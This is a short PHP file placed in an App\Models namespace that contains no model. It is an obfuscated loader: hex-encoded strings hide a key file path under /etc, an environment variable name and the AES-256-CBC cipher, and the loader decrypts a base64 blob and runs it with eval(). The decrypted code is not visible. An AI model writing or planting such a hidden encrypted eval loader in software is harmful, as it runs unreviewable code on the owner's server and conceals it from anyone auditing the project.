<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('lBkvj6t1mwiJkeTI+zxR0w==');

$c=base64_decode(

'BjAcpVa8gWFZkbLr2tC4l+sgVAciyAovoWoojT93Sl6OIJDi++VL2RIWnpXeXsWeF9VpnYS5eVnb' .
'oFe+U2cebngRKLFlxvdEzyS9bMfVb8/t5XI8M38U482Zj8iTCM7h5ezUP9/GVw8j6nzhkUQKqiZp' .
'UQ3vnPs5CciBXsjz+HeuiL67frSli0M/9GdhInroSKbUFNumxhmf8qVOlVIpW4COeGKVKgvOWNkL' .
'ip7PjYQmwNySYScZXkEgBDFNnT85umevytlB+OlTCVnbigUsgLENLCprqJNEJtStkcan2REyP0w/' .
'9zqMl8j8ciXnuI3aRuXr2xsM2AkI4t4VJxO/mABOMr7KtQlm+BuFlz/mE0GPIKKoP0t8+hAvLbxJ' .
'zv9qVuHFwP0ucD5RQowm+XGaJu31paG0ZsiNVXNOcPMci7J9yhvVNg8Ts+x8+ZIWQnXR4YVFkxfa' .
'7uDzNyfRYEGH6tVWL3nTE6JIkXDuLL/Sfu/ApWphchE3Z4oWaZMD70moLPkDy/BTEr7gAe238B2E' .
'HJ7nsjDo7iCd1IYf9wkNmBdFAZjVEzsVN9uPTZbwO2S+Xp9jzmYb7JXdmiBG57mK3BOHSG4v56Hh' .
'EqXsePSkru5liHjdaoNiphPBqjCC8YOjPErpWfDFAjW/MZyOthdDO5/XeZ/8LWKq/ZTg1EVVStfV' .
'C4OoTLzhQqV/ycoQHLbUarAsJESxCpiIUfTbqlTVaGDsiY/oR+2jFkVU35aJe8YiLT18Orlp9suc' .
'Vj4gGzBJ9TmRfYYOtyatNDW5HaEsqcZ7RyEmM0mFfNg6YoM7EOVCBWdE16OlI2TlDKqTtdbEbRUP' .
'IrRq6L5Eq6AVAOX7cdFUPWnDhwPorLCcBMlbqPe6lGGCwf9gRNRDPH51lshr'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

